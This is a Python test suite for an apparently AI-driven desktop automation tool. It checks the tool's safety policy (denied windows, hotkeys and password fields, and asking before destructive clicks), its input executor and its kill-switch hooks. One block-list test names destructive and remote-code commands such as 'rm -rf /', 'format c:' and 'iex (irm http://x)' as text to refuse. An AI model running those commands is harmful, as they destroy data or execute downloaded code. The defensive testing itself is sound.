import asyncio
import threading
import time

import pytest

from stickfigure.actions.executor import Click, Executor, Keys, Move, Pause, Type, Wheel
from stickfigure.actions.schema import PAYLOAD_TOKEN, extract_payload, parse_step, pick_elements
from stickfigure.perception.uia import UIElement
from stickfigure.safety.policy import (
    ALLOW, ASK, DENY, Proposed, WindowInfo, decide, normalize_keys, window_problem,
)
from stickfigure.world.geometry import Rect

DOCS = WindowInfo(1, "chrome.exe", "Chrome_WidgetWin_1", "Untitled document - Google Docs - Google Chrome")
BODY = UIElement("Document content", "Edit", Rect(100, 100, 900, 900))


def el(name, role="Button", **kw):
    return UIElement(name, role, Rect(0, 0, 10, 10), **kw)


# -- policy: windows ------------------------------------------------------------------------


@pytest.mark.parametrize("win", [
    WindowInfo(2, "powershell.exe", "ConsoleWindowClass", "Windows PowerShell"),
    WindowInfo(3, "WindowsTerminal.exe", "CASCADIA_HOSTING_WINDOW_CLASS", "Terminal"),
    WindowInfo(4, "cmd.exe", "ConsoleWindowClass", "Command Prompt"),
    WindowInfo(5, "explorer.exe", "#32770", "Run"),
    WindowInfo(6, "Taskmgr.exe", "TaskManagerWindow", "Task Manager"),
    WindowInfo(7, "regedit.exe", "RegEdit_RegEdit", "Registry Editor"),
    WindowInfo(8, "chrome.exe", "Chrome_WidgetWin_1", "Checkout - PayPal - Google Chrome"),
    WindowInfo(9, "KeePassXC.exe", "Qt5QWindowIcon", "Passwords.kdbx - KeePassXC"),
    WindowInfo(10, "SystemSettings.exe", "ApplicationFrameWindow", "Settings"),
])
def test_never_touches_sensitive_windows(win):
    assert window_problem(win)
    for kind in ("click", "type_text", "hotkey", "scroll"):
        d = decide(Proposed(kind, el("OK"), text="hello", keys="enter"), win, None, task_approved=True)
        assert d.verdict == DENY


def test_ordinary_windows_allowed():
    assert window_problem(DOCS) is None
    assert window_problem(WindowInfo(1, "Code.exe", "Chrome_WidgetWin_1", "app.py - StickFigure - Visual Studio Code")) is None


# -- policy: typing ------------------------------------------------------------------------------


def test_supervised_asks_and_task_approval_allows():
    p = Proposed("type_text", text="Hello there, this is a paragraph.")
    assert decide(p, DOCS, BODY).verdict == ASK
    assert decide(p, DOCS, BODY, task_approved=True).verdict == ALLOW


def test_never_types_into_password_fields():
    pw = UIElement("Password", "Edit", Rect(0, 0, 10, 10), is_password=True)
    assert decide(Proposed("type_text", text="hunter2hunter2"), DOCS, pw, task_approved=True).verdict == DENY


@pytest.mark.parametrize("focused", [
    UIElement("Terminal 1, pwsh", "Edit", Rect(0, 0, 1, 1)),
    UIElement("", "Edit", Rect(0, 0, 1, 1), automation_id="xterm-helper-textarea"),
])
def test_never_types_into_terminal_panes(focused):
    code = WindowInfo(1, "Code.exe", "Chrome_WidgetWin_1", "Visual Studio Code")
    assert decide(Proposed("type_text", text="ls"), code, focused, task_approved=True).verdict == DENY


@pytest.mark.parametrize("text", [
    "powershell -enc AAAA", "cmd /c del C:\\x", "C:\\Windows\\System32\\calc.exe", "javascript:alert(1)",
    "rm -rf /", "iex (irm http://x)", "reg add HKLM\\Software", "format c:", "setup.msi", "ms-settings:privacy",
])
def test_blocks_command_like_text(text):
    assert decide(Proposed("type_text", text=text), DOCS, BODY, task_approved=True).verdict == DENY


def test_ordinary_prose_with_trigger_words_is_fine():
    text = ("Please format the report so the delete button is clearer. The shell of the turtle was cmd-shaped; "
            "we'll run the numbers and remove duplicates.")
    assert decide(Proposed("type_text", text=text), DOCS, BODY, task_approved=True).verdict == ALLOW


def test_multiline_text_asks_only_outside_documents():
    single = UIElement("Search", "Edit", Rect(0, 0, 300, 30))
    d = decide(Proposed("type_text", text="line one\nline two"), DOCS, single, task_approved=True)
    assert d.verdict == ASK and d.always_ask  # Enter in a single-line field can submit a form
    d = decide(Proposed("type_text", text="line one\nline two"), DOCS, BODY, task_approved=True, multiline=True)
    assert d.verdict == ALLOW  # in a document it's just a new line


def test_enter_and_backspace_fine_in_documents_but_ask_elsewhere():
    for k in ("enter", "backspace"):
        assert decide(Proposed("hotkey", keys=k), DOCS, BODY, task_approved=True, multiline=True).verdict == ALLOW
        assert decide(Proposed("hotkey", keys=k), DOCS, None, task_approved=True).always_ask


# -- policy: keys & clicks -------------------------------------------------------------------------


@pytest.mark.parametrize("keys", ["win+r", "Win+X", "alt+f4", "ctrl+alt+delete", "ctrl+shift+esc", "alt+tab", "win", "ctrl+w", "f5"])
def test_dangerous_hotkeys_denied(keys):
    assert decide(Proposed("hotkey", keys=keys), DOCS, BODY, task_approved=True).verdict == DENY


def test_safe_hotkeys():
    assert normalize_keys("Control + A") == "ctrl+a"
    assert decide(Proposed("hotkey", keys="ctrl+a"), DOCS, BODY, task_approved=True).verdict == ALLOW
    enter = decide(Proposed("hotkey", keys="Enter"), DOCS, BODY, task_approved=True)
    assert enter.verdict == ASK and enter.always_ask


@pytest.mark.parametrize("name", ["Delete", "Send", "Submit order", "Pay now", "Publish", "Move to trash", "Sign out"])
def test_destructive_clicks_always_ask(name):
    d = decide(Proposed("click", el(name)), DOCS, None, task_approved=True)
    assert d.verdict == ASK and d.always_ask


def test_normal_click_after_task_approval():
    assert decide(Proposed("click", el("Bold")), DOCS, None, task_approved=True).verdict == ALLOW


def test_clicking_into_a_terminal_denied():
    assert decide(Proposed("click", el("New Terminal", "MenuItem")), DOCS, None, task_approved=True).verdict == DENY


# -- schema ---------------------------------------------------------------------------------------------


def test_extract_payload_verbatim():
    assert extract_payload('type "The quick brown fox jumps." into my doc') == "The quick brown fox jumps."
    msg = "Type this paragraph into my Google Doc: Dear team, I don't think we're ready yet. Let's wait."
    assert extract_payload(msg) == "Dear team, I don't think we're ready yet. Let's wait."
    assert extract_payload("click the share button") is None


def test_parse_step_substitutes_payload_and_validates_ids():
    els = [el("Share"), BODY]
    win = Rect(0, 0, 1000, 1000)
    s = parse_step({"action": "type_text", "element_id": 1, "text": PAYLOAD_TOKEN, "keys": "", "amount": 0,
                    "say": "", "thought": ""}, els, win, "exact text!")
    assert s.text == "exact text!" and s.element is BODY
    assert isinstance(parse_step({"action": "click", "element_id": 9}, els, win, None), str)
    assert parse_step({"action": "click", "element_id": 0}, els, win, None).element is els[0]  # id 0 is valid
    assert isinstance(parse_step({"action": "rm_rf"}, els, win, None), str)
    # No user-supplied text: the placeholder must not be typed literally.
    assert isinstance(parse_step({"action": "type_text", "element_id": 1, "text": PAYLOAD_TOKEN}, els, win, None), str)
    s = parse_step({"action": "click", "element_id": -1, "x": 0.5, "y": 0.25}, els, win, None)
    assert s.point == (500, 250)


def test_pick_elements_hides_password_fields():
    els = [el("Share"), UIElement("pw", "Edit", Rect(0, 0, 1, 1), is_password=True)]
    assert all(not e.is_password for e in pick_elements(els, "share"))


# -- executor (fake driver: nothing touches the real desktop) -----------------------------------------------


class FakeDriver:
    def __init__(self, target=1, pid=100):
        self.events = []
        self.fg = target
        self.pids = {target: pid}
        self.rects = {target: Rect(0, 0, 1000, 1000)}
        self.cursor = (500, 500)
        self.clip = "user's clipboard"
        self.text_only = True
        self.cover_pid = None

    def move_to(self, x, y):
        self.cursor = (x, y)
        self.events.append(("move", round(x), round(y)))

    def mouse_button(self, b, down):
        self.events.append(("btn", b, down))

    def wheel(self, n):
        self.events.append(("wheel", n))

    def key(self, k, up=False):
        self.events.append(("key", k, up))

    def unicode_char(self, ch):
        self.events.append(("char", ch))

    def release_all(self):
        self.events.append(("release_all",))

    def cursor_pos(self):
        return self.cursor

    def clipboard_is_text_only(self):
        return self.text_only

    def get_clipboard_text(self):
        return self.clip

    def set_clipboard_text(self, t):
        self.events.append(("clip", t))
        self.clip = t
        return True

    def foreground(self):
        return self.fg

    def window_pid(self, h):
        return self.pids.get(h, 0)

    def bounds(self, h):
        return self.rects.get(h)

    def pid_at(self, x, y):
        return self.cover_pid or self.pids[1]


class FastCfg:
    typing_wpm = 6000  # keep tests quick
    paste_threshold = 40
    max_clicks_per_sec = 1000.0


def ex(driver):
    return Executor(cfg=FastCfg(), driver=driver)


def test_click_moves_then_clicks_inside_window():
    d = FakeDriver()
    r = ex(d).run([Move(200, 300), Click()], 1)
    assert r.ok
    assert d.events[-2:] == [("btn", "left", True), ("btn", "left", False)]
    assert ("move", 200, 300) in d.events


def test_refuses_points_outside_target():
    d = FakeDriver()
    r = ex(d).run([Move(1500, 300)], 1)
    assert r.status == "out_of_bounds"
    assert not any(e[0] == "move" and e[1] > 1000 for e in d.events)
    assert d.events[-1] == ("release_all",)


def test_refuses_when_another_window_covers_the_point():
    d = FakeDriver()
    d.cover_pid = 999
    assert ex(d).run([Move(200, 300), Click()], 1).status == "out_of_bounds"
    assert not any(e[0] == "btn" for e in d.events)


def test_stops_when_focus_moves_to_another_app():
    d = FakeDriver()
    d.pids[2] = 555  # e.g. a terminal someone popped up
    e = ex(d)

    def steal():
        time.sleep(0.02)
        d.fg = 2

    threading.Thread(target=steal).start()
    e.cfg.typing_wpm = 600
    r = e.run([Type("abcdefghijklmnopqrstuvwxyz0123")], 1)
    assert r.status == "foreground_lost"
    typed = [ev for ev in d.events if ev[0] == "char"]
    assert 0 < len(typed) < 30


def test_cursor_may_travel_over_other_windows_but_clicks_only_on_target():
    d = FakeDriver()
    chat = Rect(300, 300, 600, 600)  # our chat box, on top, between the cursor and the target
    d.cursor = (100, 100)
    d.pid_at = lambda x, y: 999 if chat.contains(x, y) else 100
    assert ex(d).run([Move(900, 900), Click()], 1).ok  # the path crosses the chat box: fine
    assert ex(d).run([Move(450, 450), Click()], 1).status == "out_of_bounds"  # clicking *on* it: refused


def test_own_window_stealing_focus_is_recovered():
    d = FakeDriver()
    d.pids[5] = 4242  # e.g. our speech bubble popped up and took focus
    d.own_pid = 4242
    d.refocus = lambda h: (setattr(d, "fg", h), True)[1]
    e = ex(d)
    d.fg = 5
    assert e.run([Type("hi")], 1).ok
    assert d.fg == 1


def test_popups_from_same_app_are_ok():
    d = FakeDriver()
    d.pids[7] = d.pids[1]  # a menu owned by the target app
    d.rects[7] = Rect(900, 900, 1300, 1300)
    d.fg = 7
    assert ex(d).run([Move(1200, 1200), Click()], 1).ok


def test_cancel_halts_within_one_event_and_releases_keys():
    d = FakeDriver()
    e = ex(d)
    e.cfg.typing_wpm = 300  # 40 ms per char
    fut = e.submit([Type("x" * 39)], 1)
    time.sleep(0.15)
    t_cancel = time.perf_counter()
    e.cancel("kill switch")
    r = fut.result(2)
    assert r.status == "cancelled" and r.detail == "kill switch"
    assert (r.halted_at - t_cancel) < 0.05  # nothing sent more than 50 ms after the cancel
    assert d.events[-1] == ("release_all",)
    e.close()


def test_long_text_is_pasted_and_clipboard_restored():
    d = FakeDriver()
    text = "A fairly long paragraph that should be pasted rather than typed out."
    assert ex(d).run([Type(text)], 1).ok
    assert ("clip", text) in d.events
    assert ("key", "ctrl", False) in d.events and ("key", "v", False) in d.events
    assert d.clip == "user's clipboard"
    assert not any(e[0] == "char" for e in d.events)


def test_long_text_is_typed_when_clipboard_holds_non_text():
    d = FakeDriver()
    d.text_only = False  # e.g. user copied an image: don't clobber it
    text = "A fairly long paragraph that should be typed out instead."
    assert ex(d).run([Type(text)], 1).ok
    assert "".join(e[1] for e in d.events if e[0] == "char") == text
    assert not any(e[0] == "clip" for e in d.events)


def test_hotkey_modifiers_always_released():
    d = FakeDriver()
    assert ex(d).run([Keys("ctrl+a")], 1).ok
    assert d.events == [("key", "ctrl", False), ("key", "a", False), ("key", "a", True), ("key", "ctrl", True)]


def test_typing_speed_respects_wpm():
    d = FakeDriver()
    e = Executor(cfg=type("C", (), {"typing_wpm": 600, "paste_threshold": 999, "max_clicks_per_sec": 3.0})(), driver=d)
    t0 = time.perf_counter()
    e.run([Type("abcdefghij")], 1)  # 600 wpm = 50 chars/s -> ~0.2 s for 10 chars
    assert time.perf_counter() - t0 >= 0.18


def test_click_reaims_if_the_user_nudged_the_mouse():
    d = FakeDriver()
    e = ex(d)
    fut = e.submit([Move(200, 300), Pause(0.1), Click()], 1)
    time.sleep(0.05)
    d.cursor = (640, 480)  # the user's hand moved the mouse mid-step (no longer stops the task)
    assert fut.result(2).ok
    i = d.events.index(("btn", "left", True))
    assert d.events[i - 1] == ("move", 200, 300)  # re-aimed right before pressing
    e.close()


# -- override triggers (hook logic, fed synthetic structs) ----------------------------------------------

from stickfigure.actions.input_driver import INJECT_TAG  # noqa: E402
from stickfigure.safety.override import (  # noqa: E402
    KBDLLHOOKSTRUCT, LLKHF_INJECTED, MSLLHOOKSTRUCT, WM_LBUTTONDOWN, WM_MOUSEMOVE, InputWatch,
)


def watcher(triggers=("esc",)):
    seen = {"user": [], "kill": 0}
    w = InputWatch(lambda k: seen["user"].append(k), lambda: seen.__setitem__("kill", seen["kill"] + 1), triggers)
    return w, seen


def key(vk, injected=False, tag=0):
    return KBDLLHOOKSTRUCT(vk, 0, LLKHF_INJECTED if injected else 0, 0, tag)


def mouse(x, y):
    m = MSLLHOOKSTRUCT()
    m.pt.x, m.pt.y = x, y
    return m


def test_moving_the_mouse_or_typing_does_not_stop_by_default():
    w, seen = watcher()
    for x in range(0, 2000, 50):
        w._on_mouse(mouse(x, 100), WM_MOUSEMOVE)
    w._on_mouse(mouse(10, 10), WM_LBUTTONDOWN)
    assert not w._on_key(key(0x41), True)  # 'a' passes through untouched
    assert seen == {"user": [], "kill": 0}


def test_esc_stops_and_is_swallowed():
    w, seen = watcher()
    assert w._on_key(key(0x1B), True) is True
    assert w._on_key(key(0x1B), False) is True
    assert seen["user"] == ["Esc key"]


def test_our_own_injected_esc_is_ignored():
    w, seen = watcher()
    assert w._on_key(key(0x1B, injected=True, tag=INJECT_TAG), True) is False
    assert seen["user"] == []


def test_kill_combo():
    w, seen = watcher()
    w._on_key(key(0xA2), True)  # left ctrl
    w._on_key(key(0xA4), True)  # left alt
    assert w._on_key(key(0x13), True) is True
    assert seen["kill"] == 1


def test_optional_triggers_can_be_enabled():
    w, seen = watcher(("esc", "click", "mouse_move"))
    w._on_mouse(mouse(10, 10), WM_LBUTTONDOWN)
    w._on_mouse(mouse(0, 0), WM_MOUSEMOVE)
    w._on_mouse(mouse(100, 0), WM_MOUSEMOVE)
    assert seen["user"] == ["mouse click", "mouse"]


# -- click point selection ---------------------------------------------------------------------------------

from stickfigure.actions.task import clickable_point  # noqa: E402


def test_click_point_prefers_visible_center():
    assert clickable_point(Rect(0, 0, 100, 100), Rect(0, 0, 1000, 1000), 7, lambda x, y: 7) == (50, 50)


def test_click_point_uses_visible_part_of_huge_element():
    page = Rect(100, 100, 900, 5000)  # a document far taller than the window
    pt = clickable_point(page, Rect(0, 0, 1000, 800), 7, lambda x, y: 7)
    assert 100 <= pt[1] <= 800


def test_click_point_none_when_off_screen_or_covered():
    assert clickable_point(Rect(2000, 0, 2100, 100), Rect(0, 0, 1000, 1000), 7, lambda x, y: 7) is None
    assert clickable_point(Rect(0, 0, 100, 100), Rect(0, 0, 1000, 1000), 7, lambda x, y: 8) is None


def test_click_rate_limited():
    d = FakeDriver()
    e = Executor(cfg=type("C", (), {"typing_wpm": 80, "paste_threshold": 40, "max_clicks_per_sec": 5.0})(), driver=d)
    t0 = time.perf_counter()
    e.run([Click(), Click(), Click()], 1)
    assert time.perf_counter() - t0 >= 0.38  # 3 clicks at <= 5/s
